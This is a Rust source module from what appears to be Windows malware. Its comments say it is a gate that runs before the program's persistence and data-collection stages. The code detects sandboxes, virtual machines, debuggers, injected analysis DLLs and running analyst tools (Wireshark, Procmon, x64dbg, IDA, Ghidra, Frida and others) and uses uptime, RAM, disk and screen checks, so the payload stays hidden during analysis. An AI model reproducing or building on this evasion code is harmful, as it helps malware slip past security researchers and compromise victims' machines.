//! Pre-flight gate. Runs before persistence and collection so an analysis host
//! never sees the payload do anything.

use winapi::shared::minwindef::{BOOL, DWORD};
use winapi::shared::ntdef::ULARGE_INTEGER;
use winapi::um::debugapi::{CheckRemoteDebuggerPresent, IsDebuggerPresent};
use winapi::um::fileapi::GetDiskFreeSpaceExW;
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::sysinfoapi::{
    GetSystemInfo, GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO,
};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, Process32FirstW, Process32NextW,
    MODULEENTRY32W, PROCESSENTRY32W, TH32CS_SNAPMODULE, TH32CS_SNAPPROCESS,
};
use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};

const MIN_UPTIME_MS: u64 = 10 * 60 * 1000;
const MIN_RAM: u64 = 1_800_000_000;
const MIN_DISK: u64 = 60 * 1024 * 1024 * 1024;
const MIN_WIDTH: i32 = 1024;
const MIN_HEIGHT: i32 = 720;

/// Host and account fragments that analysis images ship with.
const BAD_NAMES: &[&str] = &[
    "sandbox",
    "sandboxie",
    "virus",
    "malware",
    "maltest",
    "cuckoo",
    "wdagutilityaccount",
    "flarevm",
    "remnux",
    "inetsim",
    "malwareanalysis",
    "virtualbox",
    "vmware",
    "qemu",
];

/// DLLs injected by debuggers, API monitors and sandbox runtimes.
const BAD_MODULES: &[&str] = &[
    "sbiedll.dll",
    "dbghelp.dll",
    "api_log.dll",
    "dir_watch.dll",
    "pstorec.dll",
    "vmcheck.dll",
    "wpespy.dll",
    "cmdvrt32.dll",
    "cmdvrt64.dll",
    "sxin.dll",
    "snxhk.dll",
    "x32dbg.dll",
    "x64dbg.dll",
    "hook.dll",
    "pydll.dll",
    "scylla.dll",
];

/// Tools that mean someone is looking at the sample right now.
const BAD_PROCESSES: &[&str] = &[
    "wireshark.exe",
    "dumpcap.exe",
    "fiddler.exe",
    "fiddler everywhere.exe",
    "httpdebuggerui.exe",
    "httpdebugger.exe",
    "smsniff.exe",
    "netmon.exe",
    "procmon.exe",
    "procmon64.exe",
    "procexp.exe",
    "procexp64.exe",
    "processhacker.exe",
    "systeminformer.exe",
    "autoruns.exe",
    "autorunsc.exe",
    "tcpview.exe",
    "regmon.exe",
    "filemon.exe",
    "x32dbg.exe",
    "x64dbg.exe",
    "ollydbg.exe",
    "windbg.exe",
    "cdb.exe",
    "ida.exe",
    "ida64.exe",
    "idaq.exe",
    "idaq64.exe",
    "ghidra.exe",
    "binaryninja.exe",
    "hopper.exe",
    "dnspy.exe",
    "ilspy.exe",
    "dotpeek.exe",
    "jd-gui.exe",
    "pestudio.exe",
    "pe-bear.exe",
    "cff explorer.exe",
    "lordpe.exe",
    "importrec.exe",
    "apimonitor.exe",
    "api-monitor.exe",
    "scylla.exe",
    "megadumper.exe",
    "frida-server.exe",
    "frida-helper.exe",
    "sandboxie.exe",
    "sbiesvc.exe",
    "vmtoolsd.exe",
    "vboxservice.exe",
    "vboxtray.exe",
    "vmwaretray.exe",
    "vmwareuser.exe",
    "joeboxserver.exe",
    "joeboxcontrol.exe",
    "df5serv.exe",
];

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn from_wide(buf: &[u16]) -> String {
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..end])
}

fn uptime_ms() -> u64 {
    unsafe { GetTickCount64() }
}

fn total_ram() -> u64 {
    unsafe {
        let mut status: MEMORYSTATUSEX = std::mem::zeroed();
        status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as DWORD;
        if GlobalMemoryStatusEx(&mut status) == 0 {
            return 0;
        }
        status.ullTotalPhys
    }
}

fn cores() -> u32 {
    unsafe {
        let mut info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut info);
        info.dwNumberOfProcessors
    }
}

fn disk_total() -> u64 {
    let drive = std::env::var("SystemDrive").unwrap_or_else(|_| String::from("C:"));
    let path = wide(&format!("{}\\", drive.trim_end_matches('\\')));
    let mut available = 0u64;
    let mut total = 0u64;
    let mut free = 0u64;
    unsafe {
        let ok = GetDiskFreeSpaceExW(
            path.as_ptr(),
            &mut available as *mut u64 as *mut ULARGE_INTEGER,
            &mut total as *mut u64 as *mut ULARGE_INTEGER,
            &mut free as *mut u64 as *mut ULARGE_INTEGER,
        );
        if ok == 0 {
            return 0;
        }
    }
    total
}

fn screen() -> (i32, i32) {
    unsafe { (GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)) }
}

fn profile_missing() -> bool {
    std::env::var_os("USERPROFILE")
        .filter(|v| !v.is_empty())
        .is_none()
}

fn debugger_attached() -> bool {
    unsafe {
        if IsDebuggerPresent() != 0 {
            return true;
        }
        let mut remote: BOOL = 0;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut remote) != 0 && remote != 0
    }
}

fn process_names() -> Vec<String> {
    let mut out = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return out;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as DWORD;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                out.push(from_wide(&entry.szExeFile).to_ascii_lowercase());
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    out
}

fn module_names() -> Vec<String> {
    let mut out = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
        if snap == INVALID_HANDLE_VALUE {
            return out;
        }
        // 32-bit modules are only visible from a 32-bit caller.
        let mut entry: MODULEENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<MODULEENTRY32W>() as DWORD;
        if Module32FirstW(snap, &mut entry) != 0 {
            loop {
                out.push(from_wide(&entry.szModule).to_ascii_lowercase());
                if Module32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    out
}

fn suspicious_name() -> bool {
    let mut names = Vec::new();
    if let Ok(user) = std::env::var("USERNAME") {
        names.push(user.to_ascii_lowercase());
    }
    if let Ok(host) = std::env::var("COMPUTERNAME") {
        names.push(host.to_ascii_lowercase());
    }
    names
        .iter()
        .any(|name| BAD_NAMES.iter().any(|bad| name.contains(bad)))
}

fn analysis_process() -> bool {
    process_names()
        .iter()
        .any(|name| BAD_PROCESSES.contains(&name.as_str()))
}

fn injected_module() -> bool {
    module_names()
        .iter()
        .any(|name| BAD_MODULES.contains(&name.as_str()))
}

/// `Some(reason)` when the machine looks like an analysis host.
pub fn detected() -> Option<&'static str> {
    if uptime_ms() < MIN_UPTIME_MS {
        return Some("uptime");
    }
    if total_ram() < MIN_RAM {
        return Some("memory");
    }
    if cores() < 2 {
        return Some("cpu");
    }
    if disk_total() < MIN_DISK {
        return Some("disk");
    }
    let (width, height) = screen();
    if width < MIN_WIDTH || height < MIN_HEIGHT {
        return Some("display");
    }
    if profile_missing() {
        return Some("profile");
    }
    if debugger_attached() {
        return Some("debugger");
    }
    if injected_module() {
        return Some("module");
    }
    if suspicious_name() {
        return Some("name");
    }
    if analysis_process() {
        return Some("process");
    }
    None
}
